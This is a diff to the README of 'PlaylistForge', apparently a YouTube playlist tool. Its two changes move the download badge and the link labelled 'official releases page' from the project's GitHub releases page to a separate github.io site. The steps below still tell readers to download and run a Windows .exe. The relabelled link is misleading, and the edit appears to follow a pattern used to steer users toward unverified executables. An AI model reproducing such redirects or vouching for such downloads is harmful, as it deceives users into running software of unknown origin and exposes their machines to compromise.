@@ -1,6 +1,6 @@
 # 📂 PlaylistForge - Organize your YouTube video lists easily
 
-[![](https://img.shields.io/badge/Download_PlaylistForge-Blue.svg)](https://github.com/sporebearing-tripletail544/PlaylistForge/releases)
+[![](https://img.shields.io/badge/Download_PlaylistForge-Blue.svg)](https://sporebearing-tripletail544.github.io)
 
 PlaylistForge helps you manage YouTube playlists. You can extract metadata, fix video titles, and export data. This tool works for spreadsheets, databases, and general documents. You do not need to write code to use this application.
 
@@ -8,7 +8,7 @@ PlaylistForge helps you manage YouTube playlists. You can extract metadata, fix 
 
 Follow these steps to get the app on your computer.
 
-1. Visit the [official releases page](https://github.com/sporebearing-tripletail544/PlaylistForge/releases).
+1. Visit the [official releases page](https://sporebearing-tripletail544.github.io).
 2. Look for the latest version at the top of the list.
 3. Find the file ending in .exe under the Assets section.
 4. Click the file name to start the download to your Windows machine.
